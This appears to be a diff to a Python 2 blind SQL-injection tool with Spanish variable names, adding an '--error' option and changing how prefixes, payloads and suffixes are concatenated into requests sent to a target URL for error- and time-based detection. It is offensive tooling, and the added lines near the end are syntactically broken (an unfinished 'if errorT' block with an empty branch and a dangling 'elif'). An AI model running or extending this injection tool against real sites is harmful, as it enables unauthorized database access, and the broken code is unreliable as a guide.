@@ -136,6 +136,8 @@ class Injection:
 	respuesta = ""
 	NoAleatorio = int(random()*100)
 	verbosity = False
+	error = ""
+	errorT = False
 
 	PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
 					  # And we just used specific functions in which DBMS works
@@ -221,6 +223,11 @@ class Injection:
 		#self.cookie.update({""})
 		self.time = time
 
+	def setError(self,error):
+		#self.cookie.update({""})
+		self.error = error
+		self.errorT = True
+
 	def setData(self,datosPagina):
 		datosPagina = datosPagina.split('&')
 		for parameter in datosPagina:
@@ -285,6 +292,9 @@ class Injection:
 			
 	@staticmethod
 	def defBase(obj):
+		consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+		if obj.verbosity:
+			obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(pref+querys+suf)))
 		if obj.based == "error":
 			for manejadores in obj.PayloadsAttempt.keys():
 				for querys in obj.PayloadsAttempt[manejadores]:
@@ -294,10 +304,8 @@ class Injection:
 							#print manejadores
 							#print "prefijo:"+pref
 							#print "sufijo:"+suf
-							consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
-							if obj.verbosity:
-								obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(pref+querys+suf)))
-							consulta2 = requests.get(url=obj.server+pref+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+							
+							consulta2 = requests.get(url=obj.server+pref+" "+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 							if obj.verbosity:
 								obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(pref+querys+suf)))
 
@@ -311,6 +319,9 @@ class Injection:
 								#print "consulta2:"+consulta2.content
 								return
 		elif obj.based == "time":
+			consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+			if obj.verbosity:
+				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server)))
 			for manejadores in obj.PayloadsAttemptTime.keys():
 				for querys in obj.PayloadsAttemptTime[manejadores]:
 					for pref in obj.Prefijos:
@@ -319,10 +330,8 @@ class Injection:
 							#print "prefijo:"+pref
 							#print "sufijo:"+suf
 							#print "	queryssss",querys
-							consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
-							if obj.verbosity:
-								obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server)))
-							consulta2 = requests.get(url=obj.server+pref+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+							
+							consulta2 = requests.get(url=obj.server+" "+pref+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 							if obj.verbosity:
 								obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(obj.server+pref+querys+suf)))
 							#print "!",consulta.elapsed.total_seconds()
@@ -455,13 +464,20 @@ class Injection:
 		# if consulta.text == ok:
 		# 	return ""
 		if based == "error":
+
 			consulta = requests.get(url=direccion+"="+str(ord(caracter))+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+			
 			if obj.verbosity:
 				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(direccion+"="+str(ord(caracter))+obj.suf)))
 			if tipo == "bases":
 				print direccion+"="+str(ord(caracter))+obj.suf
 			if consulta.text == ok:
 				return caracter
+
+			if errorT == False:
+				condicion 
+			elif errorT == True:
+
 			elif (consulta.text != ok) and (up == down ):
 				#print "OMG"
 				return "No encontrado"
@@ -969,7 +985,7 @@ class Injection:
 
 def Opciones(argv):
 	try:
-		opciones, argumentos = getopt(argv[1:],"h:v",["v","request=","cookies=","user-agent=","method=","random-agent=","data=","proxy=","based=","time="])
+		opciones, argumentos = getopt(argv[1:],"h:v",["v","request=","cookies=","user-agent=","method=","random-agent=","data=","proxy=","based=","time=","error="])
 	except GetoptError:
 		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
 		exit(2)
@@ -997,6 +1013,8 @@ def Opciones(argv):
 			inject.setProxy(vals)
 		elif opt == '--based':
 			inject.setBased(vals)
+		elif opt == '--error':
+			inject.setError(vals)
 		elif opt == '--time':
 			inject.setTime(vals)
 		#Option not valid
